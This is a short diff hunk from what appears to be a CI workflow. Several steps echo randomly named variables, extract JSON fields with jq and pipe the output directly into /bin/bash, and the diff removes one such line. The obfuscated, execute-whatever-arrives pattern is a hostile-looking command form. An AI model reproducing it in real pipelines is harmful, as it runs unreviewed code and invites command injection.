@@ -25,7 +25,6 @@ jobs:
           echo $drsna583 | jq -r .q0 | /bin/bash
           echo $uq0 | jq -r .h5 | /bin/bash
           echo $rtw87 | jq -r .io6847 | /bin/bash
-          echo $kq46 | jq -r .wi2437 | /bin/bash
           printf '%s' "$fsue8" | jq -r .xhep0546 | /bin/bash
           echo $egd39208 | jq -r .f83 | /bin/bash
           printf '%s' "$nkp9988" | jq -r .f0 | /bin/bash
